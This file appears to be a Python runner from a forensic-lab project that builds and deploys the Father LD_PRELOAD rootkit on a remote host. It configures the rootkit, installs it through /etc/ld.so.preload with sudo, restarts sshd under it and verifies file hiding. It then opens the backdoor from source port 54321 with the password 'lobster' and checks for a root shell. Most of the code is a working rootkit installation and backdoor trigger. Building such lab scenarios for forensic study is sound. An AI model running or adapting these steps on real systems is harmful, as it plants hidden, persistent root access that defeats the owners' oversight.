"""Explicit runner for the Father LD_PRELOAD scenario."""

from __future__ import annotations

import re
import socket
import time
from pathlib import Path

import yaml

from orchestrator.core import console
from orchestrator.core.provenance import file_sha256
from orchestrator.core.ssh_client import SSHClient, TerminalCommandResult
from scenarios.command_log import append_record, log_command, utc_now


SCENARIO_ID = "userland_father_ldpreload"
ROOT = Path(__file__).resolve().parent
ARCHIVE = ROOT / "files/father-upstream-4eb2712.tar"
LOCK = ROOT / "father.lock.yml"

REMOTE_ROOT = "/tmp/forensic-lab/father_ldpreload"
UPLOAD_PATH = "/tmp/father-upstream-4eb2712.tar"
INSTALLED_LIBRARY = "/usr/local/lib/forensic-lab/father/selinux.so.3"
PRELOAD_CONFIG = "/etc/ld.so.preload"
PROCESS_DURATION_SECONDS = 1800
SOURCE_PORT = 54321
SHELL_PASSWORD = b"lobster\0"

COMMANDS = (
    "set -o pipefail",
    f"root={REMOTE_ROOT}",
    'source_dir="$root/source"; '
    'father_source_tree="$source_dir/Father-4eb2712caf612a7dc55fd4f34ff5c72b74c7c332"; '
    'father_archive="$source_dir/father-upstream-4eb2712.tar"; '
    'father_config="$father_source_tree/src/config.h"; '
    'father_library="$father_source_tree/rk.so"; '
    'probe_dir="$root/probe"; marker="$probe_dir/__malicious_file"; '
    'before_output="$probe_dir/before.txt"; after_output="$probe_dir/after.txt"',
    'echo "[father] checking prerequisites and unpacking pinned source"',
    "command -v gcc >/dev/null",
    "command -v make >/dev/null",
    "command -v systemctl >/dev/null",
    "test -x /usr/bin/python3 && test -x /usr/bin/setsid && "
    "test -x /usr/bin/sleep && test -x /bin/ls",
    "test -f /usr/include/security/pam_appl.h && "
    "test -f /usr/include/gcrypt.h",
    "ldconfig -p | grep 'libgcrypt\\.so' >/dev/null",
    f'mkdir -p "$source_dir" "$probe_dir" && mv -- {UPLOAD_PATH} "$father_archive"',
    'rm -rf "$father_source_tree" && tar -xf "$father_archive" -C "$source_dir"',
    'test -f "$father_config"',
    "sed -i "
    "-e 's|^#define STRING .*|#define STRING \"__malicious_\"|' "
    "-e 's|^#define PRELOAD .*|#define PRELOAD \"father_calibration_nohide\"|' "
    f"-e 's|^#define INSTALL_LOCATION .*|#define INSTALL_LOCATION \"{INSTALLED_LIBRARY}\"|' "
    '"$father_config"',
    'grep -Fqx \'#define GID 1337\' "$father_config"',
    'grep -Fqx \'#define SOURCEPORT 54321\' "$father_config"',
    'grep -Fqx \'#define SHELL_PASS "lobster"\' "$father_config"',
    'grep -Fqx \'#define STRING "__malicious_"\' "$father_config"',
    'grep -Fqx \'#define PRELOAD "father_calibration_nohide"\' "$father_config"',
    f'grep -Fqx \'#define INSTALL_LOCATION "{INSTALLED_LIBRARY}"\' "$father_config"',
    'sha256sum "$father_config"',
    'echo "[father] building and activating the shared object"',
    'cd "$father_source_tree" && make father',
    'test -f "$father_library" && sha256sum "$father_library"',
    'touch "$marker" && ls -1 -- "$probe_dir" > "$before_output"',
    "grep -Fqx '__malicious_file' \"$before_output\"",
    f'sudo -n install -d -m 0755 "$(dirname {INSTALLED_LIBRARY})"',
    f'sudo -n install -m 0644 "$father_library" {INSTALLED_LIBRARY}',
    f"sudo -n env LD_PRELOAD={INSTALLED_LIBRARY} /usr/bin/python3 -c "
    "'from pathlib import Path; import sys; "
    "assert sys.argv[1] in Path(\"/proc/self/maps\").read_text()' "
    f"{INSTALLED_LIBRARY}",
    f"printf '%s\\n' {INSTALLED_LIBRARY} | sudo -n tee {PRELOAD_CONFIG} >/dev/null && "
    f"sudo -n chmod 0644 {PRELOAD_CONFIG}",
    'echo "[father] keeping three mapped root processes alive for acquisition"',
    "pids=(); for _ in 1 2 3; do "
    "pid=\"$(sudo -n /bin/sh -c "
    "'/usr/bin/setsid /usr/bin/sleep \"$1\" </dev/null >/dev/null 2>&1 & echo $!' "
    f"sh {PROCESS_DURATION_SECONDS})\"; "
    '[[ "$pid" =~ ^[1-9][0-9]*$ ]] || break; pids+=("$pid"); '
    'done; [[ "${#pids[@]}" -eq 3 ]]',
    "sleep 1; all_mapped=true; for pid in \"${pids[@]}\"; do "
    f'sudo -n kill -0 "$pid" && sudo -n grep -Fq {INSTALLED_LIBRARY} "/proc/$pid/maps" '
    '|| all_mapped=false; done; [[ "$all_mapped" == true ]]',
    'echo "[father] restarting sshd under Father and validating file hiding"',
    "sudo -n systemctl restart ssh.service",
    'sshd_pid="$(sudo -n systemctl show --property=MainPID --value ssh.service)"; '
    '[[ "$sshd_pid" =~ ^[1-9][0-9]*$ ]]',
    f'sudo -n grep -Fq {INSTALLED_LIBRARY} "/proc/$sshd_pid/maps"',
    'ls -1 -- "$probe_dir" > "$after_output"',
    'after_listing="$(< "$after_output")"; '
    '[[ "$after_listing" != *"__malicious_file"* ]]',
    '[[ "$after_listing" == *"before.txt"* ]] && [[ -e "$marker" ]]',
    "printf 'FATHER_RESULT pids=%s,%s,%s sshd_pid=%s\\n' "
    '"${pids[0]}" "${pids[1]}" "${pids[2]}" "$sshd_pid"',
)


def run_father(
    ssh: SSHClient,
    transcript_path: Path,
    response_path: Path,
    *,
    command_log_path: Path,
    run_id: str,
) -> dict:
    """Run Father visibly in Bash, then validate its native accept-hook shell."""
    transcript_path.touch()
    response_path.touch()
    source = _verify_source(command_log_path, run_id)
    _upload_archive(ssh, command_log_path, run_id)

    terminal = ssh.open_terminal()
    results: list[TerminalCommandResult] = []
    try:
        with terminal:
            for index, command in enumerate(COMMANDS, start=1):
                started_at = utc_now()
                try:
                    result = terminal.run(command, timeout=180)
                except Exception as exc:
                    log_command(
                        command_log_path,
                        run_id,
                        SCENARIO_ID,
                        index,
                        command,
                        started_at,
                        status="failure",
                        error=str(exc),
                    )
                    raise
                results.append(result)
                status = "success" if result.exit_code == 0 else "failure"
                log_command(
                    command_log_path,
                    run_id,
                    SCENARIO_ID,
                    index,
                    command,
                    started_at,
                    status=status,
                    result=result,
                )
                if result.exit_code != 0:
                    raise RuntimeError(
                        f"Father command exited {result.exit_code}: {command}"
                    )
    finally:
        transcript_path.write_text(terminal.transcript, encoding="utf-8")

    match = re.search(
        r"FATHER_RESULT pids=(\d+),(\d+),(\d+) sshd_pid=(\d+)",
        results[-1].combined_output,
    )
    if match is None:
        raise RuntimeError("Father did not return the validated process IDs")

    identity = _validate_backdoor(
        ssh,
        response_path,
        command_log_path=command_log_path,
        run_id=run_id,
    )
    return {
        "source": source,
        "installed_library_path": INSTALLED_LIBRARY,
        "preload_config_path": PRELOAD_CONFIG,
        "affected_pids": [int(value) for value in match.groups()[:3]],
        "sshd_pid": int(match.group(4)),
        "marker_path": f"{REMOTE_ROOT}/probe/__malicious_file",
        "hiding_before_output_path": f"{REMOTE_ROOT}/probe/before.txt",
        "hiding_after_output_path": f"{REMOTE_ROOT}/probe/after.txt",
        "file_hiding_passed": True,
        "father_backdoor_passed": True,
        "backdoor_identity": identity,
        "trigger_source_port": SOURCE_PORT,
        "listener_service": "sshd",
        "listener_port": ssh.port,
        "backdoor_response_path": response_path.name,
    }


def _verify_source(command_log_path: Path, run_id: str) -> dict:
    started_at = utc_now()
    try:
        lock = yaml.safe_load(LOCK.read_text(encoding="utf-8"))
        archive_hash = file_sha256(ARCHIVE)
        expected_hash = lock["retrieval"]["archive_sha256"]
        if archive_hash != expected_hash:
            raise RuntimeError(
                "Father archive SHA-256 mismatch: "
                f"expected {expected_hash}, got {archive_hash}"
            )
    except Exception as exc:
        append_record(
            command_log_path,
            {
                "run_id": run_id,
                "scenario_id": SCENARIO_ID,
                "step_id": "verify_father_source",
                "type": "host_verification",
                "status": "failure",
                "started_at": started_at,
                "ended_at": utc_now(),
                "error": str(exc),
            },
        )
        raise

    source = {
        "repository": lock["upstream"]["url"],
        "commit": lock["upstream"]["pinned_commit"],
        "archive_sha256": archive_hash,
    }
    append_record(
        command_log_path,
        {
            "run_id": run_id,
            "scenario_id": SCENARIO_ID,
            "step_id": "verify_father_source",
            "type": "host_verification",
            "status": "success",
            "source": source,
            "started_at": started_at,
            "ended_at": utc_now(),
        },
    )
    console.ok(f"Father source verified: {archive_hash}")
    return source


def _upload_archive(
    ssh: SSHClient,
    command_log_path: Path,
    run_id: str,
) -> None:
    started_at = utc_now()
    console.step(f"Uploading {ARCHIVE.name} to {UPLOAD_PATH}...")
    try:
        ssh.put(ARCHIVE, UPLOAD_PATH)
    except Exception as exc:
        append_record(
            command_log_path,
            {
                "run_id": run_id,
                "scenario_id": SCENARIO_ID,
                "step_id": "upload_father_source",
                "type": "upload",
                "source": str(ARCHIVE),
                "destination": UPLOAD_PATH,
                "status": "failure",
                "started_at": started_at,
                "ended_at": utc_now(),
                "error": str(exc),
            },
        )
        raise
    append_record(
        command_log_path,
        {
            "run_id": run_id,
            "scenario_id": SCENARIO_ID,
            "step_id": "upload_father_source",
            "type": "upload",
            "source": str(ARCHIVE),
            "destination": UPLOAD_PATH,
            "status": "success",
            "started_at": started_at,
            "ended_at": utc_now(),
        },
    )


def _validate_backdoor(
    ssh: SSHClient,
    response_path: Path,
    *,
    command_log_path: Path,
    run_id: str,
) -> str:
    started_at = utc_now()
    response = bytearray()
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    deadline = time.monotonic() + 12
    console.step(
        f"Connecting to {ssh.host}:{ssh.port} from Father trigger port "
        f"{SOURCE_PORT}..."
    )
    try:
        client.bind(("", SOURCE_PORT))
        client.settimeout(max(0.001, deadline - time.monotonic()))
        client.connect((ssh.host, ssh.port))

        while b"AUTHENTICATE: " not in response and time.monotonic() < deadline:
            client.settimeout(max(0.001, deadline - time.monotonic()))
            chunk = client.recv(4096)
            if not chunk:
                break
            response.extend(chunk)
        if b"AUTHENTICATE: " not in response:
            raise RuntimeError("Father authentication prompt was not received")

        client.sendall(SHELL_PASSWORD)
        authenticated_size = len(response)
        while len(response) == authenticated_size and time.monotonic() < deadline:
            client.settimeout(max(0.001, deadline - time.monotonic()))
            chunk = client.recv(4096)
            if not chunk:
                break
            response.extend(chunk)
        if len(response) == authenticated_size:
            raise RuntimeError("Father did not accept the backdoor password")

        client.sendall(b"id\n")
        while (
            (b"uid=0(root)" not in response or b"gid=1337" not in response)
            and time.monotonic() < deadline
        ):
            client.settimeout(max(0.001, deadline - time.monotonic()))
            chunk = client.recv(4096)
            if not chunk:
                break
            response.extend(chunk)
        if b"uid=0(root)" not in response or b"gid=1337" not in response:
            raise RuntimeError("Father shell did not return the expected root identity")
    except (OSError, RuntimeError) as exc:
        response_path.write_bytes(response)
        append_record(
            command_log_path,
            {
                "run_id": run_id,
                "scenario_id": SCENARIO_ID,
                "step_id": "validate_father_backdoor",
                "type": "host_socket",
                "command": "id",
                "trigger_source_port": SOURCE_PORT,
                "destination_host": ssh.host,
                "destination_port": ssh.port,
                "response_path": response_path.name,
                "response_excerpt": response.decode(errors="replace")[-1200:],
                "status": "failure",
                "started_at": started_at,
                "ended_at": utc_now(),
                "error": str(exc),
            },
        )
        raise RuntimeError(f"Father backdoor validation failed: {exc}") from exc
    finally:
        client.close()

    response_path.write_bytes(response)
    response_text = response.decode(errors="replace")
    identity = next(
        line.strip()
        for line in response_text.splitlines()
        if "uid=0(root)" in line and "gid=1337" in line
    )
    append_record(
        command_log_path,
        {
            "run_id": run_id,
            "scenario_id": SCENARIO_ID,
            "step_id": "validate_father_backdoor",
            "type": "host_socket",
            "command": "id",
            "trigger_source_port": SOURCE_PORT,
            "destination_host": ssh.host,
            "destination_port": ssh.port,
            "response_path": response_path.name,
            "response_excerpt": response_text[-1200:],
            "identity": identity,
            "status": "success",
            "started_at": started_at,
            "ended_at": utc_now(),
        },
    )
    console.ok(f"Father shell response: {identity}")
    console.info(f"Father shell transcript: {response_path.name}")
    return identity
